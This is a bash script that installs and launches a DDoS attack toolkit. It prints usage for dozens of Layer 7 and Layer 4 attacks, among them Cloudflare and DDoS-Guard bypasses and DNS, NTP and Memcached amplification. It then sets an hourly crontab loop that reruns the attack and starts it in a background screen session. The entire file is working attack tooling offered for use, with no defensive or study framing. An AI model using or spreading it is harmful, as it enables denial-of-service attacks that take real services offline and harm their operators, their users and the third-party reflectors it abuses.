echo "========================================"
echo "=====  DDoS TOOLS INSTALL STARTING ======"
echo "========================================"
sleep 6
echo ""
echo ""
apt -y update
apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git
chmod +rwx *.sh
cd
cp -r ProDDoS Stats
cp -r ProDDoS DDoS
rm -rf Pro*
cd DDoS
pip3 install -r requirements.txt
cd ../
clear
read -r -p "Want to read usage information? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
then
echo ""
echo ""
echo " __ Debug Mode - Log Attack status __"
echo "python start.py bypass https://example.com 5 1000 socks5.txt 100 100 true"
echo "python start.py udp 1.1.1.1:53 1 100 true"
echo "python start.py dns 1.1.1.1:53 1 100 dns.txt true"
echo "python start.py minecraft 1.1.1.1:53 1 100 5 socks5.txt true"
echo ""
read -p "Press enter to continue reading..."
echo ""
echo " __ Layer7 - Websites __"
echo "# Running bypass attack from 101 threads, with socks 5, 100 requests per proxy (connection), for 3600 seconds"
echo "python start.py bypass https://example.com 5 101 socks5.txt 100 3600"
echo "# Running bomb attack from 50 threads (be careful must be < 300) with all proxies (0), 100 requests per proxy (connection), for 3600 seconds"
echo "python start.py bomb https://example.com 0 50 proxy.txt 100 3600"
echo ""
echo "GET        | GET Flood"
echo "POST       | POST Flood"
echo "OVH        | Bypass OVH"
echo "RHEX       | Random HEX"
echo "STOMP      | Bypass chk_captcha"
echo "STRESS     | Send HTTP Packet With High Byte"
echo "DYN        | A New Method With Random SubDomain"
echo "DOWNLOADER | A New Method of Reading data slowly"
echo "SLOW       | Slowloris Old Method of DDoS"
echo "HEAD       | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD"
echo "NULL       | Null UserAgent and ..."
echo "COOKIE     | Random Cookie PHP 'if (isset($_COOKIE))'"
echo "PPS        | Only 'GET / HTTP/1.1\r\n\r\n'"
echo "EVEN       | GET Method with more header"
echo "GSB        | Google Project Shield Bypass"
echo "DGB        | DDoS Guard Bypass"
echo "AVB        | Arvan Cloud Bypass"
echo "BOT        | Like Google bot"
echo "APACHE     | Apache Expliot"
echo "XMLRPC     | WP XMLRPC expliot (add /xmlrpc.php)"
echo "CFB        | CloudFlare Bypass"
echo "CFBUAM     | CloudFlare Under Attack Mode Bypass"
echo "BYPASS     | Bypass Normal AntiDDoS"
echo "BOMB       | Bypass with codesenberg/bombardier"
echo "KILLER     | Run many threads to kill a target"
echo "TOR        | Bypass onion website"
echo ""
read -p "Press enter to continue reading..."
echo ""
echo " __ Layer4 - Server/Home __"
echo "# Running udp attack from 1 threads, for 3600 seconds"
echo "python start.py udp 1.1.1.1:53 1 3600"
echo "# Running dns attack from 100 threads, for 3600 seconds with reflector servers from dns.txt, for 3600 seconds  "
echo "python start.py dns 1.1.1.1:53 100 3600 dns.txt"
echo "# Running minecraft attack from 1000 threads with socks 5, for 3600 seconds"
echo "python start.py minecraft 1.1.1.1:53 1000 3600 5 socks5.txt"
echo ""
echo "TCP        | TCP Flood Bypass"
echo "UDP        | UDP Flood Bypass"
echo "sSYN       | SYN Flood"
echo "CPS        | Open and close connections with proxy"
echo "ICMP       | Icmp echo request flood (Layer3)"
echo "CONNECTION | Open connection alive with proxy"
echo "VSE        | Send Valve Source Engine Protocol"
echo "TS3        | Send Teamspeak 3 Status Ping Protocol"
echo "FIVEM      | Send FiveM Status Ping Protocol"
echo "MEM        | Memcached Amplification"
echo "NTP        | NTP Amplification"
echo "MCBOT      | Minecraft Bot Attack"
echo "MINECRAFT  | Minecraft Status Ping Protocol"
echo "MCPE       | Minecraft PE Status Ping Protocol"
echo "DNS        | DNS Amplification"
echo "CHAR       | Chargen Amplification"
echo "CLDAP      | Cldap Amplification"
echo "ARD        | Apple Remote Desktop Amplification"
echo "RDP        | Remote Desktop Protocol Amplification"
echo ""
read -p "Press enter to continue reading..."
echo ""
echo " __ Tools - Run With: start.py tools __"
echo "CFIP       | Find Real IP Address Of Websites Powered By Cloudflare"
echo "DNS        | Show DNS Records Of Sites"
echo "TSSRV      | TeamSpeak SRV Resolver"
echo "PING       | PING Servers"
echo "CHECK      | Check If Websites Status"
echo "DSTAT      | That Shows Bytes Received, bytes Sent and their amount"
echo ""
read -p "Press enter to continue reading..."
echo ""
echo " __ Other - Run With: start.py help __"
echo "STOP       | STOP All Attacks"
echo "TOOLS      | Console Tools"
echo "HELP       | Show Usage Script"
else
echo ""
echo ""
read -p "Great you know what you are doing! Press enter to continue"
fi
clear
echo ""
echo ""
echo " ONLY EDIT FILE BETWEEN:"
echo "### START EDITING HERE ###"
echo "AND"
echo "###### STOP EDITING #####"
read -r -p "Do you understand and do you want to edit attack script? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
then
  nano attack.sh
  echo ""
  echo ""
  read -p "Press enter to setup loop..."
else
  echo ""
  echo ""
	read -p "Press enter to run enable or disable loop..."
fi
clear
echo ""
echo ""
read -r -p "Do you want to loop script every hour? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
then
    screen -d -m -S setCrontab && screen -S setCrontab -X stuff $'crontab -e\n' && sleep 5 && screen -S setCrontab -X stuff $'* */1 * * * ./attack.sh\n' && screen -S setCrontab -X stuff $'^x\n' && screen -S setCrontab -X stuff $'y\n' && screen -S setCrontab -X stuff $'\n' && screen -S setCrontab -X stuff $'^a^d\n' 
read -p "Running loop in background every hour. Press enter to continue..."
  echo ""
  echo ""
else
  echo ""
  echo ""
	read -p "Press enter if you want to start attack now only once..."
fi
read -r -p "Start attack now? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
then
echo "========================================"
echo "=========== GETTING READY  ============"
echo "========================================"
pkill screen
sleep 3
echo ""
echo ""
clear
echo "========================================"
echo "===========  STARTING STATS ============"
echo "========================================"
screen -d -m -S Stats && screen -S Stats -X stuff $'cd Stats\n' && screen -S Stats -X stuff $'python3 start.py tools\n' && screen -S Stats -X stuff $'dstat\n'
sleep 6
echo ""
echo ""
clear
echo "========================================"
echo "==========  STARTING ATTACK  ==========="
echo "========================================"
echo ""
echo ""
screen -d -m -S DDoS && screen -r DDoS -X stuff $'./attack.sh\n'
read -p "If you setup the crontab it will run 58 min and restarts 2 min later to loop attack. Running on background. Done! Press enter to exit..."
  screen -S DDoS -X stuff $'^a^d\n' 
else
	echo ""
  echo ""
  read -p "Attack starting in 1 hour of you enabled loop. Press enter to exit..."
fi
exit 0

